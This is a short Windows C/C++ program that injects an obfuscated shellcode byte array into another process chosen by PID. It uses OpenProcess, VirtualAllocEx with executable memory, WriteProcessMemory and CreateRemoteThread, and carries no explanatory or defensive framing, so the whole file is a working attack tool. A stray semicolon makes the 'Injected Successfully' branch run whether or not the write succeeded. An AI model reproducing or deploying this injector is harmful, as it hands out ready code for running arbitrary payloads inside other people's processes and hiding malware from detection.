#include<windows.h>
#include<stdio.h>


int main(int argc, char *argv[])
{
	int pid = atoi(argv[1]);
	char sc[] = "\xdb\xc3\xd9\x74\x24\xf4\xbb\x67\xbf\xc2\xf2\x58\x33\xc9\xb1"
"\x31\x31\x58\x18\x03\x58\x18\x83\xc0\x63\x5d\x37\x0e\x83\x23"
"\xb8\xef\x53\x44\x30\x0a\x62\x44\x26\x5e\xd4\x74\x2c\x32\xd8"
"\xff\x60\xa7\x6b\x8d\xac\xc8\xdc\x38\x8b\xe7\xdd\x11\xef\x66"
"\x5d\x68\x3c\x49\x5c\xa3\x31\x88\x99\xde\xb8\xd8\x72\x94\x6f"
"\xcd\xf7\xe0\xb3\x66\x4b\xe4\xb3\x9b\x1b\x07\x95\x0d\x10\x5e"
"\x35\xaf\xf5\xea\x7c\xb7\x1a\xd6\x37\x4c\xe8\xac\xc9\x84\x21"
"\x4c\x65\xe9\x8e\xbf\x77\x2d\x28\x20\x02\x47\x4b\xdd\x15\x9c"
"\x36\x39\x93\x07\x90\xca\x03\xec\x21\x1e\xd5\x67\x2d\xeb\x91"
"\x20\x31\xea\x76\x5b\x4d\x67\x79\x8c\xc4\x33\x5e\x08\x8d\xe0"
"\xff\x09\x6b\x46\xff\x4a\xd4\x37\xa5\x01\xf8\x2c\xd4\x4b\x96"
"\xb3\x6a\xf6\xd4\xb4\x74\xf9\x48\xdd\x45\x72\x07\x9a\x59\x51"
"\x6c\x44\xb8\x70\x98\xed\x65\x11\x21\x70\x96\xcf\x65\x8d\x15"
"\xfa\x15\x6a\x05\x8f\x10\x36\x81\x63\x68\x27\x64\x84\xdf\x48"
"\xad\xe7\xbe\xda\x2d\xc6\x25\x5b\xd7\x16";
	HANDLE phandle;
	LPVOID ptrafterallocated;
	phandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
	if (phandle == NULL)
	{
		printf("Error while open the process\n");

	}
	else{
		printf("Process Opened sucessfully\n");
	}

	ptrafterallocated = VirtualAllocEx(phandle, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (ptrafterallocated == NULL){
		printf("Error while get the base address to write\n");
	}
	else{
		printf("Got the address to write 0x%x\n", ptrafterallocated);
	}

	if (WriteProcessMemory(phandle, (LPVOID)ptrafterallocated, (LPCVOID)sc, sizeof(sc), 0));
	{
		printf("Injected Successfully");
		CreateRemoteThread(phandle, NULL, 100, (LPTHREAD_START_ROUTINE)ptrafterallocated, NULL, NULL, reinterpret_cast<DWORD*>(0x50002));
	
	}
	
	
	return 0;

}